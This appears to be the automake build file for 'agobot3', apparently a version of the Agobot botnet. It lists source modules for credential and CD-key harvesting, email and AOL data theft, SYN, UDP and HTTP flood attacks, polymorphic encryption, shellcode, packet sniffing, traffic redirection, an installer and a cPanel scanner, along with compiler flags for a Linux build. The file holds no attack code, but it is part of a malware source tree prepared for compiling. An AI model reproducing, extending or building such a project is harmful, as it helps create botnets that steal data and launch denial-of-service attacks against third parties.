noinst_PROGRAMS=agobot3
agobot3_SOURCES=cstring.cpp harvest_cdkeys.cpp polymorph.cpp bot.cpp cthread.cpp \
	harvest_emails.cpp logic.cpp random.cpp scanner.cpp synflood.cpp cmdline.cpp cvar.cpp harvest_registry.cpp mac.cpp \
	redir_gre.cpp sdcompat.cpp udpflood.cpp cmdshell.cpp hook.cpp mainctrl.cpp redir_http.cpp \
	shellcode.cpp commands.cpp httpflood.cpp redir_https.cpp utility.cpp \
	config.cpp ddos.cpp installer.cpp redir_socks.cpp consdbg.cpp irc.cpp \
	phaticmp.cpp redir_socks5.cpp sniffer.cpp phatsyn.cpp redir_tcp.cpp sockets.cpp \
	wonk.cpp crypter.cpp harvest_aol.cpp redirect.cpp ssllib.cpp targa3.cpp \
	cpanelscanner.cpp
if DEBUG
CXXFLAGS=-DLINUX -g -DDEBUG -D_DEBUG -DDBGCONSOLE -DAGOBOT_NO_OPENSSL
else
CXXFLAGS=-DLINUX -O1 -fomit-frame-pointer -fno-strength-reduce -ffast-math -DAGOBOT_NO_OPENSSL
endif
LDADD=ftplib/libftp.a md5/libmd5.a -lpthread
#LDFLAGS=-static
SUBDIRS=ftplib md5
